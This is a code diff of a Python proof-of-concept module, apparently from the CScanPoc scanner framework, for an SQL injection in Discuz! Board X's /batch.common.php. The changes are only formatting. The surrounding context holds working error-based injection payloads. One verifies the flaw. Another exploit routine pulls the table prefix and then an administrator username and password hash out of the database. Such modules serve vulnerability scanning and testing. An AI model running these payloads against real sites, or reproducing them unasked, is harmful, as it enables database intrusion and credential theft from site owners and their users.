@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Discuz_0012' # 平台漏洞编号，留空
+    vuln_id = 'Discuz_0012'  # 平台漏洞编号，留空
     name = 'Discuz! Board X /batch.common.php SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-10-24'  # 漏洞公布时间
     desc = '''
         Discuz! Board X /batch.common.php 存在SQL注入漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Discuz!'  # 漏洞应用名称
     product_version = '1.0.0'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'dcd30c14-75ce-450c-8a98-561dc456e94d'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             verify_url = '%s/batch.common.php' % self.target
             payload = '?action=modelquote&cid=1&name=spacecomments,(SELECT 3284 FROM(SELECT COUNT(*),CONCAT(CH' \
                       'AR(58,105,99,104,58),(MID((IFNULL(CAST(md5(160341893519135) AS CHAR),CHAR(32))),1,50)),' \
@@ -39,8 +41,8 @@ class Poc(ABPoc):
             content = requests.get(verify_url + payload).content
 
             if '3c6b20b60b3f57247420047ab16d3d71' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
@@ -60,7 +62,8 @@ class Poc(ABPoc):
                                  '2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
             match_table_priv = re.compile(':rge:(.*)access:nbs:1')
             try:
-                table_priv = match_table_priv.findall(requests.get(verify_url + payload_table_priv).content)[0]
+                table_priv = match_table_priv.findall(
+                    requests.get(verify_url + payload_table_priv).content)[0]
             except:
                 pass
 
@@ -71,7 +74,8 @@ class Poc(ABPoc):
                       '8,110,98,115,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)'
             match_result = re.compile(':rge:(.*)::([\w\d]{32}):nbs:')
             try:
-                username, password = match_result.findall(requests.get(verify_url + payload).content)[0]
+                username, password = match_result.findall(
+                    requests.get(verify_url + payload).content)[0]
             except:
                 pass
 
@@ -85,6 +89,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
